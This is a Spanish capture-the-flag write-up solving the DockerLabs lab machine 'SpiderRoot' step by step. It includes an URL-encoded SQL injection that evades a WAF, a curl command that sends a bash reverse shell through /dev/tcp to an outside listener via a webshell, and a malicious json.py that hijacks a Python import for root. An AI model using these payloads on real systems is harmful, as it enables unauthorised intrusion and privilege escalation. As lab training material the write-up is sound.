## Introducción

Este documento presenta la resolución completa de la máquina **SpiderRoot**, desarrollada por *Grooti16* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con un formulario de login vulnerable a **SQL Injection**, protegido por un WAF que se evade mediante codificación URL. El bypass revela credenciales que permiten acceso SSH como el usuario `peter`.
Una vez dentro, se descubre un panel interno en el puerto 8080 con una webshell que permite ejecutar comandos como `www-data`. Finalmente, se identifica que el usuario puede ejecutar un script Python como root mediante `sudo`, y se abusa de **Library Hijacking** importando una librería maliciosa para obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip SpiderRoot.zip
sudo bash auto_deploy.sh SpiderRoot.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p SpiderRoot/{content,exploits,nmap,scripts}
cd SpiderRoot
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1769580333/Ports_lfxt8s.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x php,html,txt,js -t 100 -C 404
```

![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1769580330/Feroxbuster_m6aqwl.png)

**Recursos relevantes:**

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Evasión de WAF

El formulario está protegido por un WAF que bloquea caracteres especiales. Se prueba un bypass con codificación URL:

```
%27%20or%201%3D1%2D%2D%20%2D
```

![Waf Evade](https://res.cloudinary.com/dewqswzke/image/upload/v1769580338/WafEvade_bkjdrc.png)

### 2.2 Extracción de credenciales

El bypass revela múltiples credenciales. Se prueba SSH con el usuario `peter`:

```bash
ssh peter@172.17.0.2
```

![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1769580335/SSH_qqliwi.png)

---

## Paso 3 — Escalada de privilegios

### 3.1 De peter → www-data

Se detecta un servicio web en el puerto 8080 con una webshell:

```php
system($cmd);
```

Se inicia un listener:

```bash
nc -nlvp 443
```

Se ejecuta la reverse shell:

```bash
curl "http://localhost:8080/?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/443%200%3E%261%27"
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1769580334/ReverseShell_vefuel.png)

### 3.2 De www-data → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1769580336/Sudo-l_rtvylf.png)

Se puede ejecutar `/opt/spidy.py` como root. El script importa librerías estándar, permitiendo **Library Hijacking**:

```python
# json.py
import os
os.system("/bin/bash")
```

```bash
sudo python3 /opt/spidy.py
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1769580335/Root_fhbzmg.png)
